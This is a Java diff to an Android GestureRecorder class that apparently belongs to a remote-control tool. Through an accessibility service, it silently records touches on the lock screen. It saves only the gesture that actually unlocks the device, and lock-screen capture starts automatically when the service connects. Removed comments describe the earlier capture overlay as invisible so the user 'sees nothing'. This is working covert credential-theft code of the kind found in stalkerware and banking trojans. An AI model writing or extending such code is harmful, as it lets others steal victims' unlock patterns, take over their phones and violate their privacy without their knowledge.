@@ -297,25 +297,6 @@ public class GestureRecorder {
     public boolean isRecording() { return isRecording; }
     public boolean isPaused()    { return isPaused; }
 
-    /**
-     * Feed a raw MotionEvent into whichever silent overlays are currently active.
-     * Called by UnifiedAccessibilityService.onMotionEvent() on API 33+ so that
-     * auto-capture can record gesture coordinates without blocking user interaction
-     * (the overlay itself has FLAG_NOT_TOUCHABLE when silent).
-     */
-    public void onExternalMotionEvent(MotionEvent event) {
-        try {
-            if (autoCapturing && autoCaptureOverlay != null) {
-                autoCaptureOverlay.externalTouch(event);
-            }
-            if (lockCaptureActive && lockCaptureOverlay != null) {
-                lockCaptureOverlay.externalTouch(event);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "onExternalMotionEvent: " + e.getMessage());
-        }
-    }
-
     /** Pause touch capture — overlay stays visible, points stop accumulating. */
     public JSONObject pauseRecording() {
         JSONObject r = new JSONObject();
@@ -464,16 +445,26 @@ public class GestureRecorder {
         return hasStroke ? builder.build() : null;
     }
 
-    // -- Auto-capture state ---------------------------------------------------
-    private volatile boolean       autoCapturing = false;
-    private volatile RecordingOverlay autoCaptureOverlay;
+    // ── Service-touch auto-capture (no overlay window) ────────────────────────
+    // Both auto-capture modes record via AccessibilityService.onTouchEvent()
+    // so no overlay is needed and the user's input is never blocked.
 
-    // -- Screen-lock auto-capture state ---------------------------------------
-    private volatile boolean       lockCaptureEnabled = false;
-    private volatile boolean       lockCaptureActive  = false;
-    private volatile RecordingOverlay lockCaptureOverlay;
-    private BroadcastReceiver      screenStateReceiver;
-    private volatile boolean       screenStateReceiverRegistered = false;
+    private volatile boolean       autoCapturing    = false;
+
+    // Points accumulated for the dashboard-started auto-capture session
+    private final List<GesturePoint> servicePts     = new ArrayList<>();
+    private volatile long            servicePtsStart = 0;
+
+    // -- Screen-lock auto-capture state (service-touch, no overlay) -----------
+    private volatile boolean         lockCaptureEnabled = false;
+    private volatile boolean         lockCaptureActive  = false;
+    // Points for the gesture currently in progress on the lock screen
+    private final List<GesturePoint> lockCurrentPts     = new ArrayList<>();
+    private volatile long            lockCurrentStart    = 0;
+    private final Handler            lockGestureHandler  = new Handler(Looper.getMainLooper());
+
+    private BroadcastReceiver        screenStateReceiver;
+    private volatile boolean         screenStateReceiverRegistered = false;
 
     /**
      * Draw a pattern from normalized node coordinates received from the dashboard.
@@ -532,8 +523,9 @@ public class GestureRecorder {
     }
 
     /**
-     * Start auto-capturing complex gestures passively.
-     * Captures multi-point curved paths; ignores simple taps and linear swipes.
+     * Start auto-capturing complex gestures via AccessibilityService.onTouchEvent().
+     * No overlay window is created — the user's interaction is never blocked.
+     * Points are collected until stopAutoCapture() is called, then saved.
      */
     public JSONObject startAutoCapture() {
         JSONObject r = new JSONObject();
@@ -541,34 +533,11 @@ public class GestureRecorder {
             if (autoCapturing) {
                 r.put("success", false); r.put("error", "Auto-capture already running"); return r;
             }
-            autoCapturing = true;
-            final boolean[] showOk = {false};
-            CountDownLatch latch = new CountDownLatch(1);
-            mainHandler.post(() -> {
-                try {
-                    autoCaptureOverlay = new RecordingOverlay(context, "auto",
-                            "auto_" + System.currentTimeMillis(), screenW, screenH, wm,
-                            () -> autoCapturing = false);
-                    autoCaptureOverlay.setSilent(true);   // invisible — user sees nothing
-                    autoCaptureOverlay.setLockMode(true); // save only the gesture that unlocks
-                    autoCaptureOverlay.show();
-                    showOk[0] = true;
-                } catch (Exception e) {
-                    Log.e(TAG, "startAutoCapture overlay: " + e.getMessage());
-                    autoCapturing = false;
-                } finally {
-                    latch.countDown();
-                }
-            });
-            latch.await(2, TimeUnit.SECONDS);
-            if (!showOk[0]) {
-                autoCapturing = false;
-                r.put("success", false);
-                r.put("error", "Failed to create capture overlay");
-                return r;
-            }
+            synchronized (servicePts) { servicePts.clear(); }
+            servicePtsStart = System.currentTimeMillis();
+            autoCapturing   = true;
             r.put("success", true);
-            r.put("message", "Auto-capture started — complex gestures will be recorded silently");
+            r.put("message", "Auto-capture started — recording via accessibility touch events");
         } catch (Exception e) {
             autoCapturing = false;
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
@@ -583,40 +552,38 @@ public class GestureRecorder {
     public JSONObject stopAutoCapture() {
         JSONObject r = new JSONObject();
         try {
-            // Stop the lock-screen auto-capture (started automatically on service connect)
-            // regardless of whether the user also manually started a capture session.
+            // Always disable lock-screen capture (runs automatically on service connect).
             disableLockScreenAutoCapture();
 
-            if (!autoCapturing || autoCaptureOverlay == null) {
-                // Lock-screen capture was stopped above; report success.
+            if (!autoCapturing) {
                 r.put("success", true);
                 r.put("saved", false);
                 r.put("message", "Auto-capture stopped");
                 return r;
             }
             autoCapturing = false;
-            final JSONObject[] saved = {null};
-            CountDownLatch latch = new CountDownLatch(1);
-            final RecordingOverlay cur = autoCaptureOverlay;
-            mainHandler.post(() -> {
-                try {
-                    saved[0] = cur.stopAndSaveIfComplex(gestureDir());
-                } catch (Exception e) {
-                    Log.e(TAG, "stopAutoCapture save: " + e.getMessage());
-                } finally {
-                    autoCaptureOverlay = null;
-                    latch.countDown();
-                }
-            });
-            latch.await(3, TimeUnit.SECONDS);
-            r.put("success", true);
-            if (saved[0] != null) {
-                r.put("saved", true);
-                r.put("result", saved[0]);
-            } else {
-                r.put("saved", false);
-                r.put("message", "No complex gestures captured (simple taps/swipes ignored)");
+
+            // Grab whatever was collected and clear the buffer.
+            List<GesturePoint> snapshot;
+            synchronized (servicePts) {
+                snapshot = new ArrayList<>(servicePts);
+                servicePts.clear();
             }
+
+            if (snapshot.size() < 10) {
+                r.put("success", true);
+                r.put("saved", false);
+                r.put("message", "No complex gestures captured");
+                return r;
+            }
+
+            long durationMs = snapshot.get(snapshot.size() - 1).t - snapshot.get(0).t;
+            JSONObject saved = saveServiceGesturePoints(
+                    snapshot, "auto", "auto_" + System.currentTimeMillis(), durationMs);
+            r.put("success", true);
+            r.put("saved", saved != null);
+            if (saved != null) r.put("result", saved);
+            else r.put("message", "Gesture too simple to save (tap/straight swipe)");
         } catch (Exception e) {
             try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
         }
@@ -718,40 +685,201 @@ public class GestureRecorder {
         }
     }
 
+    /**
+     * Mark that the lock-screen is showing and we should start capturing touches
+     * via the AccessibilityService touch-event pipeline (no overlay window).
+     */
     private void startLockCapture() {
         if (lockCaptureActive) return;
-        lockCaptureActive = true;
-        mainHandler.post(() -> {
-            try {
-                lockCaptureOverlay = new RecordingOverlay(context, "lock",
-                        "lockscreen_" + System.currentTimeMillis(), screenW, screenH, wm,
-                        () -> lockCaptureActive = false);
-                lockCaptureOverlay.setSilent(true);   // completely invisible, no visual
-                lockCaptureOverlay.setLockMode(true); // save per-gesture only on unlock
-                lockCaptureOverlay.show();
-                Log.i(TAG, "Lock-screen gesture capture STARTED");
-            } catch (Exception e) {
-                Log.e(TAG, "startLockCapture: " + e.getMessage());
-                lockCaptureActive = false;
-                lockCaptureOverlay = null;
-            }
-        });
+        synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
+        lockCurrentStart    = System.currentTimeMillis();
+        lockCaptureActive   = true;
+        Log.i(TAG, "Lock-screen capture STARTED (service-touch mode)");
     }
 
+    /**
+     * Lock screen gone (screen off or user unlocked via a different path).
+     * Discard whatever partial gesture is in progress.
+     */
     private void stopLockCapture() {
-        if (!lockCaptureActive && lockCaptureOverlay == null) return;
+        if (!lockCaptureActive) return;
         lockCaptureActive = false;
-        final RecordingOverlay cur = lockCaptureOverlay;
-        lockCaptureOverlay = null;
-        if (cur == null) return;
-        mainHandler.post(() -> {
-            try {
-                cur.stopAndSaveIfComplex(gestureDir());
-            } catch (Exception e) {
-                Log.e(TAG, "stopLockCapture save: " + e.getMessage());
+        synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
+        Log.i(TAG, "Lock-screen capture STOPPED");
+    }
+
+    // =========================================================================
+    // Service Touch Event Handling
+    // Called from UnifiedAccessibilityService.onTouchEvent() — no overlay needed.
+    // =========================================================================
+
+    /**
+     * Primary entry point: feed every MotionEvent from the AccessibilityService here.
+     * Returns immediately if neither auto-capture nor lock-capture is active.
+     * Always returns false so the system passes the touch through to the foreground app.
+     */
+    public void handleServiceTouchEvent(MotionEvent event) {
+        if (!autoCapturing && !lockCaptureActive) return;
+
+        int action    = event.getActionMasked();
+        int pidIdx    = event.getActionIndex();
+        int ptrCount  = event.getPointerCount();
+        long nowMs    = System.currentTimeMillis();
+
+        // ── Lock-screen mode: capture per-gesture, save only on successful unlock ──
+        if (lockCaptureActive) {
+            if (action == MotionEvent.ACTION_DOWN) {
+                synchronized (lockCurrentPts) { lockCurrentPts.clear(); }
+                lockCurrentStart = nowMs;
             }
-        });
-        Log.i(TAG, "Lock-screen gesture capture STOPPED");
+
+            long relT = nowMs - lockCurrentStart;
+            synchronized (lockCurrentPts) {
+                for (int i = 0; i < ptrCount; i++) {
+                    GesturePoint gp = new GesturePoint();
+                    gp.pointerId = event.getPointerId(i);
+                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
+                    gp.nx        = event.getX(i) / screenW;
+                    gp.ny        = event.getY(i) / screenH;
+                    gp.t         = relT;
+                    lockCurrentPts.add(gp);
+                }
+            }
+
+            if (action == MotionEvent.ACTION_UP || action == MotionEvent.ACTION_CANCEL) {
+                onLockGestureLifted(nowMs);
+            }
+            return;
+        }
+
+        // ── Manual auto-capture: accumulate everything until stopAutoCapture() ──
+        if (autoCapturing) {
+            long relT = nowMs - servicePtsStart;
+            synchronized (servicePts) {
+                for (int i = 0; i < ptrCount; i++) {
+                    GesturePoint gp = new GesturePoint();
+                    gp.pointerId = event.getPointerId(i);
+                    gp.action    = (i == pidIdx) ? action : MotionEvent.ACTION_MOVE;
+                    gp.nx        = event.getX(i) / screenW;
+                    gp.ny        = event.getY(i) / screenH;
+                    gp.t         = relT;
+                    servicePts.add(gp);
+                }
+            }
+        }
+    }
+
+    /**
+     * Called when the user lifts their finger on the lock screen.
+     * Waits 350 ms then checks the keyguard state: if the device is now unlocked
+     * the gesture was the correct unlock pattern, so we save it.
+     */
+    private void onLockGestureLifted(long gestureEndMs) {
+        final List<GesturePoint> snapshot;
+        synchronized (lockCurrentPts) {
+            if (lockCurrentPts.size() < 8) {
+                lockCurrentPts.clear();
+                return;
+            }
+            long dur = gestureEndMs - lockCurrentStart;
+            if (dur < 150) {
+                lockCurrentPts.clear();
+                return;
+            }
+            snapshot = new ArrayList<>(lockCurrentPts);
+            lockCurrentPts.clear();
+        }
+
+        long dur = gestureEndMs - lockCurrentStart;
+        lockGestureHandler.postDelayed(() -> {
+            try {
+                KeyguardManager km = (KeyguardManager)
+                        context.getSystemService(Context.KEYGUARD_SERVICE);
+                boolean stillLocked = km != null && km.isKeyguardLocked();
+                if (!stillLocked) {
+                    // The gesture just unlocked the device — save it.
+                    saveServiceGesturePoints(snapshot,
+                            "lock", "lockscreen_" + System.currentTimeMillis(), dur);
+                    Log.i(TAG, "Lock-screen gesture saved (" + snapshot.size() + " pts)");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "onLockGestureLifted: " + e.getMessage());
+            }
+        }, 350);
+    }
+
+    /**
+     * Persist a list of GesturePoints to a JSON file in the gesture directory.
+     * Applies the same complexity filter as RecordingOverlay.stopAndSaveIfComplex().
+     * Returns the saved-file JSONObject on success, null if the gesture was too simple.
+     */
+    private JSONObject saveServiceGesturePoints(
+            List<GesturePoint> pts, String pkgId, String label, long durationMs) {
+        try {
+            if (pts.size() < 8) return null;
+
+            // Complexity filter ― same as RecordingOverlay.stopAndSaveIfComplex
+            boolean multiPointer = false;
+            for (GesturePoint gp : pts) {
+                if (gp.pointerId != 0) { multiPointer = true; break; }
+            }
+
+            if (!multiPointer && pts.size() >= 3) {
+                GesturePoint first = pts.get(0);
+                GesturePoint last  = pts.get(pts.size() - 1);
+                float dx  = last.nx - first.nx;
+                float dy  = last.ny - first.ny;
+                float len = (float) Math.sqrt(dx * dx + dy * dy);
+                if (len < 0.05f) {
+                    if (durationMs < 1500) return null; // simple tap
+                } else {
+                    float maxDev = 0;
+                    for (GesturePoint gp : pts) {
+                        float crossLen = Math.abs((gp.nx - first.nx) * dy
+                                - (gp.ny - first.ny) * dx);
+                        float dev = crossLen / len;
+                        if (dev > maxDev) maxDev = dev;
+                    }
+                    if (maxDev <= 0.05f) return null; // straight swipe
+                }
+            }
+
+            // Build JSON payload
+            JSONArray arr = new JSONArray();
+            for (GesturePoint gp : pts) {
+                JSONObject p = new JSONObject();
+                p.put("id",     gp.pointerId);
+                p.put("action", gp.action);
+                p.put("nx",     gp.nx);
+                p.put("ny",     gp.ny);
+                p.put("t",      gp.t);
+                arr.put(p);
+            }
+            JSONObject data = new JSONObject();
+            data.put("label",       label);
+            data.put("packageId",   pkgId);
+            data.put("screenW",     screenW);
+            data.put("screenH",     screenH);
+            data.put("durationMs",  durationMs);
+            data.put("recordedAt",  System.currentTimeMillis());
+            data.put("points",      arr);
+
+            String ts  = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
+                    .format(new Date());
+            String fn  = pkgId + "_" + label + "_" + ts + ".json";
+            File   out = new File(gestureDir(), fn);
+            try (FileWriter fw = new FileWriter(out)) { fw.write(data.toString()); }
+
+            JSONObject res = new JSONObject();
+            res.put("filename",   fn);
+            res.put("pointCount", pts.size());
+            res.put("durationMs", durationMs);
+            Log.i(TAG, "Service gesture saved: " + fn + " (" + pts.size() + " pts)");
+            return res;
+        } catch (Exception e) {
+            Log.e(TAG, "saveServiceGesturePoints: " + e.getMessage());
+            return null;
+        }
     }
 
     // =========================================================================
